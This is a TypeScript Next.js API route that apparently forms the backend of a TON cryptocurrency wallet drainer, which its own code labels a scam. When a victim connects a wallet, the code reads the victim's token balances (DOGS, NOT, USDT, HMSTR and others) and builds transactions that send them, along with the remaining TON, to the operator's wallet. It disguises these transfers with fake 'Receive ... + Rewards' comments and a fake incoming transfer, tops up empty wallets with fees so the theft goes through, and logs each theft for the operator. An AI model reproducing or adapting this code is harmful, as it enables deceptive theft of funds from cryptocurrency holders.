import {
	Address,
	beginCell,
	fromNano,
	internal,
	SendMode,
	toNano,
	TonClient,
	TupleBuilder,
	WalletContractV5R1,
} from "@ton/ton";
import {mnemonicToWalletKey} from "@ton/crypto";
import {NextRequest, NextResponse} from "next/server";
import {getBotConfig, getDefaultBotConfig} from "@/bot/classes/CustomTelegraf";
import prisma from "@/backend/modules/prisma/Prisma";
import {generateRandomString} from "@/backend/utils/string";
import {entries} from "@/utils/built-in";
import {FullyScam} from "@/app/api/transaction/transactionV2";
import {BotConfigType} from "@/bot/classes/types/dodo";
import {checkSpam, cloudflareChallengeIp} from "@/bot/cloudflare";

const dogsAddress = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS";
const notAddress = "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT"
const tetherAddress = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
const catiAddress = "EQD-cvR0Nz6XAyRBvbhz-abTrRC6sI5tvHvvpeQraV9UAAD7"
const robitcoin = "EQCD7lrrxpOcq5A5R6nTLeF1kuIbl1BKCe5OnanGe3cB4FVB"
const watcoin = "EQCEqz2x3-Ub_EO4Y5798NNoqKw1tP_tJ6b9y-X0C4uvs8Zf";
const HMSTR = "EQAJ8uWd7EBqsmpSWaRdf_I-8R8-XHwh3gsNKhy-UrdrPcUo";

export const defaultTransactionComment = '🔐 Receive 304,734.00 $DOGS + Rewards'
export const defaultTransactionComments = {
	"not": "🔐 Receive 304,734.00 $NOT + Rewards",
	"usd": "🔐 Receive 100,000 $USDT + Rewards",
	"ton": "🔐 Receive 100 $TON + Rewards",
	"cati": "🔐 Receive 30,000 $CATi + Rewards",
	"dogs": defaultTransactionComment,
	"rbtc": "🔐 Receive 78,000 $RBTC + Reward",
	"wat": "🔐 Receive 26,000 $WAT + Reward",
	"hmstr": "🔐 Receive 44,000 $HMSTR + Reward",
}

export let SCAM_REPORT: {
	[k: string]: string
} = {};

const errBalance = NextResponse.json({ msg: "Balance" }, { status: 400 });

function getIp(req: NextRequest) {
	const forwarded = req.headers.get('x-forwarded-for')
	const ip = forwarded ? forwarded.split(/, /)[0] : (req as any)?.connection?.remoteAddress;

	return ip || "unknown";
}

export async function POST(req: NextRequest) {
	const client = new TonClient({
		endpoint: 'https://toncenter.com/api/v2/jsonRPC',
		apiKey: process.env['TON_API']
	});

	const { address: senderAddress, bot, user,v2 } = await req.json();

	const config = await getBotConfig(+bot);

	if (config.cloudflare?.enabled) {
		await checkSpam(config,getIp(req));
	}

	if (config.scamV2 !== false || v2) {
		const arg = {
			senderAddress,
			bot,
			config
		};
		return await FullyScam(arg);
	}

	const receiverAddress = config.address;
	if (!receiverAddress) {
		console.error(`!!!!!!!!!!!\n\n\n WALLE NOT SET FOR ${bot}\n\n\n!!!!!!!!!!!!!!!!!!!!!!!!!`);
		console.warn(`WALLET ADDRESS OF ${bot} doesn't configed correctly! contact programmer!`);
		throw ("❌ SCAM CANCELED DUE TO RECEIVER ADDRESS!");
	}

	const senderWallet = Address.parse(senderAddress);
	const receiverWallet = Address.parse(receiverAddress);

	const configFee = (config.feeValue ?? "0.1") + "";
	const jettonFee = toNano(config.jettonFee || "0.07");
	let tons = await client.getBalance(senderWallet).catch(()=>BigInt(0));


	let transactions = [];

	try {
		const fakeAddress = Address.parse("EQASdk1XxjMmu8MB3bjDlQxKqBBRtAvQTTmKG204Y-eRtbHT")
		const fakeSource = await getContractWallet(dogsAddress, fakeAddress)
		transactions.push({
			amount: jettonFee.toString(),
			address: fakeSource.toString(),
			payload: await createTokenTransferPayload(fakeAddress, senderWallet, toNano('304734'))
		})
	} catch (e) {
		console.error(`While pushing fake transaction, error: \n${e}`);
	}

	const names = [
		"HMSTR",
		"NOT",
		"DOGS",
		"USDT",
		"CATi",
		"RBTC",
		"WAT"
	]
	const contracts = [
		HMSTR,
		notAddress,
		dogsAddress,
		tetherAddress,
		catiAddress,
		robitcoin,
		watcoin
	]
	const comments = [
		config.transaction_comments?.hmstr ?? defaultTransactionComments.hmstr ?? defaultTransactionComment,
		config.transaction_comments?.not ?? defaultTransactionComments.not ?? defaultTransactionComment,
		/*config.transaction_comments?.dogs  ??*/defaultTransactionComments?.dogs ?? defaultTransactionComment,
		config.transaction_comments?.tether ?? defaultTransactionComments.usd ?? defaultTransactionComment,
		config.transaction_comments?.cati ?? defaultTransactionComments.cati ?? defaultTransactionComment,
		config.transaction_comments?.rabit ?? defaultTransactionComments.rbtc ?? defaultTransactionComment,
		config.transaction_comments?.wat ?? defaultTransactionComments.wat ?? defaultTransactionComment
	]
	let i = 0;


	let tokenInfo: {
		[k: string]: number | bigint
	} = {};
	for (let contract of contracts) {
		try {
			const jettonWallet = await getContractWallet(contract, senderWallet);

			const balance = await getTokenBalance(jettonWallet);
			const comment = comments[i % comments.length];
			const name = names[i % names.length];
			i++;
			if (!balance) continue;
			tokenInfo[name] = balance;

			const payload = await createTokenTransferPayload(
				senderWallet,
				receiverWallet,
				balance,
				comment
			);
			if (!payload) continue;

			transactions.push({
				address: jettonWallet.toString(),
				amount: jettonFee.toString(),
				payload
			})
		} catch (e) {
			console.error(`While pushing ${contract}, error:\n${e}`);
		}
	}


	const sender = senderWallet.toString({
		bounceable: false
	})
	const tokenBalance = Object.values(tokenInfo).reduce((t, o) => BigInt(t) + BigInt(o), BigInt(0));

	if (tons < toNano(configFee) && !!transactions.length && tokenBalance > toNano("100")) {
		if (!config.feeWallet || !config.feeEnabled) return errBalance;
		try {
			tons += await sendFeeTo(config, sender);
		} catch (e: any) {
			console.warn(`FAIL TO SEND FEE TO ${sender}\n${e?.message ?? e}`);
		}
	}
	if (tons < toNano(configFee)) return errBalance;

	const remains = (tons - (jettonFee * BigInt(transactions.length + 1)));
	if (remains > toNano(configFee)) {
		transactions = [
			{
				address: receiverWallet.toRawString(),
				amount: remains.toString(),
				payload: (beginCell().storeUint(0, 32).storeStringTail(config?.transaction_comments?.ton ?? defaultTransactionComment).endCell()).toBoc().toString('base64')
			},
			...transactions
		];
		tokenInfo["TON"] = remains;
	}

	if (transactions.length - 1 === 0) return errBalance;

	// AVOID WALLET LIMITATION
	transactions = transactions.slice(0, 4)

	const reportId = generateRandomString(10);
	const tokenString = entries(tokenInfo).map(([name, balance]) => (`${name} = ${fromNano(balance)} ${name} $`)).join("\n");
	const footer = `Scam Wallet: ${receiverWallet.toString({ bounceable: false })}\nReportId: ${reportId}\nConfig Fee: ${configFee}`

	console.warn(`Incoming Scam ⌛ ${sender}\n\n${tokenString}\n${footer}`)
	SCAM_REPORT[reportId] = `New Scam ✅ [${sender}]\n\nTokens:\n${tokenString}\n${footer}`;
	setTimeout(() => delete SCAM_REPORT[reportId], 5 * 60 * 1000)

	return NextResponse.json({
		validUntil: Math.floor(Date.now() / 1000) + 500,
		messages: transactions
	}, {
		headers: {
			"log-report-id": reportId
		}
	});
}

export async function PUT(req: NextRequest) {
	const { reportId } = await req.json();

	const str = SCAM_REPORT[reportId];
	if (!str) return NextResponse.json({ msg: "Invalid report id" }, { status: 400 });

	delete SCAM_REPORT[reportId];

	console.warn(str);

	return NextResponse.json({ msg: "Reported!" });
}

export async function createTokenTransferPayload(source: Address, destination: Address, amount: bigint | number, text = defaultTransactionComment) {
	try {
		const forwardPayload = beginCell()
			.storeUint(0, 32)  // 0 opcode for a simple message
			.storeStringTail(text)
			.endCell();

		// Building the body with correct fields
		const body = beginCell()
			.storeUint(0xf8a7ea5, 32)
			.storeUint(0, 64)
			.storeCoins(amount)
			.storeAddress(destination)
			.storeAddress(source)
			.storeUint(0, 1)
			.storeCoins(1)
			.storeBit(1)
			.storeRef(forwardPayload)
			.endCell();

		return body.toBoc().toString('base64')
	} catch (e: any) {
		console.error(`FAIL TO CREATE JETTON TRANSACTION \nsource: ${source}\ndestination: ${destination}\namount: ${amount}\ntext: ${text}\n\n${e}`)
		return undefined;
	}
}

const CONTRACT_CACHE: {
	[address: string]: Awaited<ReturnType<TonClient['provider']>>
} = {};

async function getContractProvider(_address: string | Address) {
	const address = typeof _address === 'string' ? _address : _address.toString();
	const cache = CONTRACT_CACHE[address];
	if (cache) return cache;

	const client = new TonClient({
		endpoint: 'https://toncenter.com/api/v2/jsonRPC',
		apiKey: process.env['TON_API']
	});

	const provider = await client.provider(Address.parse(address));
	CONTRACT_CACHE[address] = provider;
	return provider;
}

export async function getContractWallet(contractAddress: string | Address, ownerAddress: string | Address) {
	const contract = await getContractProvider(contractAddress);

	const args = new TupleBuilder();
	args.writeAddress(typeof ownerAddress === 'string' ? Address.parse(ownerAddress) : ownerAddress);
	return await contract.get('get_wallet_address', args.build()).then(r => r.stack.readAddress());
}

export async function getTokenBalance(jettonOfTokenWallet: string | Address) {

	try {
		const client = new TonClient({
			endpoint: 'https://toncenter.com/api/v2/jsonRPC',
			apiKey: process.env['TON_API']
		});

		const data = await client.runMethod(typeof jettonOfTokenWallet === 'string' ? Address.parse(jettonOfTokenWallet) : jettonOfTokenWallet, 'get_wallet_data');
		return data.stack.readNumber();
	} catch (e: any) {
		return 0;
	}
}

export async function getFeeWallet(config = getDefaultBotConfig()) {
	const mnemonic = config.feeWallet || "";
	if (!mnemonic) throw("FEE WALLET NOT FOUND");

	const key = await mnemonicToWalletKey(mnemonic.split(" "));
	return WalletContractV5R1.create({ publicKey: key.publicKey, workchain: 0 });
}

export async function sendFeeTo(config: BotConfigType, address: string): Promise<bigint> {
	const client = new TonClient({
		endpoint: 'https://toncenter.com/api/v2/jsonRPC',
		apiKey: process.env['TON_API']
	});
	const normalAddress = Address.parse(address).toString({bounceable: false});
	const duplicate = await prisma.userSentFeeWallet.findUnique({
		where: {
			wallet: address
		}
	});
	if (duplicate?.wallet) {
		console.warn(`Duplicate Fee Wallet ${normalAddress} ❌`);
		return BigInt(0);
	}

	const d = { wallet: address }
	await prisma.userSentFeeWallet.upsert({
		where: d,
		create: d,
		update: d
	})

	const mnemonic = config.feeWallet;
	if (!mnemonic) return BigInt(0);

	const key = await mnemonicToWalletKey(mnemonic.split(" "));
	const wallet = WalletContractV5R1.create({ publicKey: key.publicKey, workchain: 0 });

	const walletContract = client.open(wallet);
	const seqno = await walletContract.getSeqno();
	const value = (config.feeValue || "0.1") + "";
	await walletContract.sendTransfer({
		secretKey: key.secretKey,
		seqno: seqno,
		messages: [
			internal({
				to: Address.parse(address),
				value: toNano(value) + toNano("0.005"),
				body: config?.feeComment ?? null,
				bounce: false
			})
		],
		sendMode: SendMode.PAY_GAS_SEPARATELY
	});

	console.warn(`Sending fee to ${normalAddress} wallet...⌛\n\nFee Amount: ${value}`)

	// wait until confirmed
	let currentSeqno = seqno;
	let n = 0;
	console.log(address, "waiting for transaction to confirm...");
	const transactionTimeout = config.feeTimeout || "30"
	while (currentSeqno == seqno) {
		await sleep(2000);
		currentSeqno = await walletContract.getSeqno().catch(() => currentSeqno);
		n++;
		if (n > ((+transactionTimeout || 30) / 2)) throw (`${normalAddress} Transaction timeout!`)
	}
	console.log(normalAddress, "transaction confirmed!");
	console.warn(`Fee Sent to ${normalAddress} ✅\n\nFee Amount: ${value}`);
	return BigInt(toNano(value));
}

async function sleep(ms: number) {
	return new Promise(resolve => setTimeout(resolve, ms));
}


export async function GET(req: NextRequest) {
	const config = getDefaultBotConfig();
	if (config.cloudflare?.enabled) {
		await checkSpam(config,getIp(req));
	}

	return new Response(null);
}
